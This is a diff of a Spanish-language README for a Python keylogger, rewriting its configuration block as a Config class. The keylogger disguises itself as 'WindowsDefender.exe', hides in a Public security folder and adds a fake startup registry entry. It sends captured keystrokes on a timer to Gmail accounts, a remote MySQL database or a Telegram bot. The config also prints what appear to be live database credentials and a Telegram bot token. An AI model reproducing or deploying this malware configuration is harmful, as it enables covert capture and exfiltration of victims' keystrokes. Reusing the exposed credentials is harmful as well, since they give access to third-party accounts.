@@ -6,81 +6,46 @@ Proceso de Opciones avanzada del keylogger.
 
 __NOTA:__ Si no sabe no toque.
 ````py
-# ***************************************   ZONA CUSTOM AVANZADA  ***********************************
-
-# NOTA:| Solo Cambie éstas variables si sabe      |
-#      | lo que está haciendo, en caso contrario  |
-#      | el Keylogger no funcionará correctamente |
-
-def GetNameKey():                   # Retorna el nombre del Keylogger compilado *.EXE
-    return "WindowsDefender.exe"    # este archivo debe tener el mismo nombre "WindowsDefender.py"  
-def GetPathOcult():                 # Path de la carpeta donde se ocultará el Keylogger
-    return "C:\\Users\\Public\\Security\\Windows Defender\\"
-def logKeyPath():   # Ruta del registro de teclas.
-    # Ruta donde se guardará temporalmente el Registro de teclas
-    return "C:\\Users\\Public\\Security\\Settings\\"
-def LogName():  # Es el nombre que tendrá el registro de teclas.
-    return "reg.k"             # <= Opcional, cambie de nombre al archivo 
-def FilePath():
-    return GetPathOcult()+GetNameKey()  # <No cambiar>
-
-# ************************************  FIN ZONA CUSTOM AVANZADA   *********************************
-
-
-
-# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
-
-
-# ************ Zona Gmail ************* 
-def emailP():# Correo de envío [Primaria]                    
-    return "correo1@gmail.com"  # <<== Cambia éste correo
-def passP():                    # <<== Contraseña del correo
-    return "contra1"
-def emailS():# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
-    return "correo2@gmail.com"  # <<== Cambia éste correo
-def passS():                   
-    return "pass2"              # <<== Contraseña del correo 
-
-def ReceiveE():#Correos que recibirán el registro de teclas.
-    #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
-    return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
-# ************ End Zona Gmail ************* 
-
-# ************ Start Zone DATABASE ************* 
-# Nota: los datos de la base de datos son reales y publicas, solo para pruebas. 
-def DB_HOST():
-    return "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"   # Host
-def DB_USER():
-    return "udwlsyrbtldkznqo"                                       # Usuario de la base de datos
-def DB_PASS():
-    return "OR2i2dfdgWek0UDiAv4f"                                   # Contraseña de la Base de Datos
-def DB_NAME():
-    return "bh1g5gnxzw2igrvui8hq"                                   # Nombre de Base de datos
-def DB_PORT(): 
-    return "3306"                                                   # Opcional en algunos casos
-
-# ************ End Zone DATABASE ************* 
-def SendMode():
-    return 2    # 0 = Gmail
-                # 1 = DataBase              # Solo se puede usar una opción
-                # 2 = TelegramBot
-                
-                
-
-
-def timeSend(): # Tiempo de envío perzonalizado
-    return 1 #Minutos                 <= Escoja su tiempo en minutos
-
-# ************ Zone Telegram *************     
-def ID():
-    return 831756903            # <=  ID de chat telegram [Nota] no lo coloque entre comillas
-
-def Token():
-    return "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"    # Token del Bot del Telegram
-
-# ************ Zona Telegram ************* 
-
-# ************************************  FIN ZONA CUSTOM BÁSICA   *********************************
+class Config:
+    def __init__(self):
+        self.NAME_KEY = "WindowsDefender"+ ".exe"   # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
+        self.NAME_STARTUP = "Windows Defeder REG"                                   # Nombre del Keylogger en el registro
+        self.PATH_OCULT = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"    # Ruta donde se esconderá el KEYLOGGER
+        self.LOG_KEY_PATH = "C:\\Users\\Public\\Security\\Settings"+ "\\"           # Ruta del Registro de teclas
+        self.LOG_NAME = "reg" + "." + "k"
+        self.PATH_KEY = self.PATH_OCULT + self.NAME_KEY  # <No cambiar>
+        self.PATH_LOG = self.LOG_KEY_PATH + self.LOG_NAME
+                                                # Nombre y extensión del registro
+        # Importante
+        self.TIMESEND = 26 #[minutos]                                                # Tiempo de envió del registro
+        self.MODE = 2     # 0 = Gmail
+                          # 1 = DataBase                                            # Solo se puede usar una opción
+                          # 2 = TelegramBot
+    class DataBase:  # Clase de Base de datos
+        def __init__(self):
+            self.HOSTNAME = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"  # HostName
+            self.USERNAME = "udwlsyrbtldkznqo"                                      # Username
+            self.PASSWORD = "OR2i2dfdgWek0UDiAv4f"                                  # Password
+            self.DATABASE = "bh1g5gnxzw2igrvui8hq"                                  # DataBase Name
+            self.PORT     = "3306"                                                  # Port
+    class Gmail:
+        def __init__(self):
+            self.GMAIL_1 = "correo1@gmail.com"
+            self.PASS_1  = "password1"
+            self.GMAIL_2 = "correo2@gmail.com"
+            self.PASS_2  = "password2"
+            self.GMAIL_3 = "correo3@gmail.com"
+            self.PASS_3  = "password3"
+          # Solo un correo Recibirá el Registro de Teclas
+            self.RECEIVERS = ["receivers1@yahoo.com"]
+          # Correos que recibiran el Registro de teclas, pueden ser de 1 a muchos
+          # self.RECEIVERS = ["receivers1@yahoo.com","receivers2@gmail.com","receivers3@hotmail.com"]
+    class TelegramBot:
+        def __init__(self):
+            self.ID   = 831756903                                                     # ID Principal [Obligatorio]
+            self.ID_2 = 000000000                                                     # ID secundario [Opcional]
+            self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
+            self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"             # TOKEN de tu Bot [Obligatorio]
 ````
 
 # Proceso de conversión: `*.py a *.exe`
